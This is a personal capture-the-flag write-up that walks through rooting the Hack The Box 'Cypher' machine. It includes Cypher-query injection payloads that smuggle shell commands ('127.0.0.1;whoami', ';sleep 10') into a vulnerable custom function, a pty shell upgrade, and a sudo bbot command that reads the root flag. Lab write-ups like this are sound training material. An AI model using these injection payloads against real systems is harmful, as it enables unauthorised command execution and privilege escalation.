> 🧠 It's the beginning of the journey.

This is **Machine 1 of 1000** — part of my mission to become a stronger red teamer by solving and documenting every challenge I encounter.

In this writeup, I’ll walk you through how I rooted the **Cypher** machine from Hack The Box, explaining each step from enumeration to exploitation.
### Full port scanning
The first step is to perform a full scan using Nmap to identify open ports and services. However, since a full scan can take a long time, we can start by using the `-F` flag to scan the 1,000 most common ports. Until the full scan finishes.
``` shell
sudo nmap 10.10.11.57 -F -Pn -T5 -sV 
```

from here we get that http post is open, so next step is to check this website. BUT accessing the ip from browser alone wont work, since the ip must be added to /etc/hosts

![Whatever Alt Text You Want](/assets/img/attachements/cypher3.png)

Now that we got the domain name, lets add it to /etc/hosts

![Whatever Alt Text You Want](/assets/img/attachements/cypher4.png)
![Whatever Alt Text You Want](/assets/img/attachements/cypher5.png)

This is how the webpage looked like, next step is content discovery for this domain, and until the fuzzing process is done i will test SQLi at this login form.
```shell
ffuf -u http://cypher.htb/FUZZ -w /usr/share/wordlists/SecLists-master/Discovery/Web-Content/directory-list-2.3-medium.txt -recursion -recursion-depth 2
```

I got this error which disclose that the database used is Neoj4, and a critical information, that the username is directly added to the cypher query without validations.

![Whatever Alt Text You Want](/assets/img/attachements/cypher7.png)

And fuzzing result shows this directory, so lets check what does it contains

![Whatever Alt Text You Want](/assets/img/attachements/cypher8.png)

Which look interesting, after downloading this jar file and extracted its content

![Whatever Alt Text You Want](/assets/img/attachements/cypher9.png)

found those classes and the suspicious one is CustomFunction

![Whatever Alt Text You Want](/assets/img/attachements/cypher10.png)

Since its compiled file and not human readable, I will use online decompiler to make it readable.

![Whatever Alt Text You Want](/assets/img/attachements/cypher11.png)

Here we can see the vulnerable point, where the url is inserted into the curl command without sanitization or validation beyond checking for http:// or https:// prefixes.

![Whatever Alt Text You Want](/assets/img/attachements/cypher12.png)

Exploiting this vulnerability in url didn't work 
### From this point we have two methods to gain the initial access:
**Method one**:

from the point that the username is inserted directly to the cypher query, we can create custom query, that ends the username field and call the vulnerable function getURLStatusCode
`"username":"') CALL getUrlStatusCode('http://127.0.0.1;whoami') // '"`

![Whatever Alt Text You Want](/assets/img/attachements/cypher13.png)
![Whatever Alt Text You Want](/assets/img/attachements/cypher14.png)

its important here to keep in mind the response time.

![Whatever Alt Text You Want](/assets/img/attachements/cypher15.png)

which proves the blind command injection vulnerability here.
```json
{"username": "admin' RETURN h.value AS value UNION CALL custom.getUrlStatusCode('127.0.0.1;sleep 10') YIELD statusCode AS value RETURN value; //",

"password":"admin"}
```
Now, its time to create the reverse shell payload, and setting a listener at the same time

![Whatever Alt Text You Want](/assets/img/attachements/cypher16.png)

whow!! Worked!

![Whatever Alt Text You Want](/assets/img/attachements/cypher17.png)

and we got our initial access

**Method 2**:

![Whatever Alt Text You Want](/assets/img/attachements/cypher18.png)

Taking the machine as hint, we find that the endpoint /cypher is exposed, and as showen in the image, there is a missing parameter for it called query, so would query work as our vulnerable point?

![Whatever Alt Text You Want](/assets/img/attachements/cypher19.png)

lets craft the payload passed on cypher syntax

![Whatever Alt Text You Want](/assets/img/attachements/cypher20.png)

This is the indication that this is an injectable parameter for us, next step is to exploit it using the vulnerable class mentioned before.

`/api/cypher?query=CALL%20custom.getUrlStatusCode('http://127.0.0.1;id')`

![Whatever Alt Text You Want](/assets/img/attachements/cypher21.png)

And done! back to the initial access part:
To make the shell mor usable and interactive

`python3 -c 'import pty; pty.spawn("/bin/bash")'`

![Whatever Alt Text You Want](/assets/img/attachements/cypher22.png)

Here we find a saved credentials at this file so lets do password spraying here!

![Whatever Alt Text You Want](/assets/img/attachements/cypher23.png)

Using the found password we gained access using ssh as graphasm user.

## Privilege Escalation
![Whatever Alt Text You Want](/assets/img/attachements/cypher24.png)

This user has a root privilage on bbot, which is a tool as we see

![Whatever Alt Text You Want](/assets/img/attachements/cypher25.png)

Next step is either to use it to execute different commands, or to read the root.txt file with it

`sudo /usr/local/bin/bbot -cy /root/root.txt --debug 2>&1 | tee output.log
`
![Whatever Alt Text You Want](/assets/img/attachements/cypher26.png)

We were able to read the root content file using yara rules, and ROOTED!!
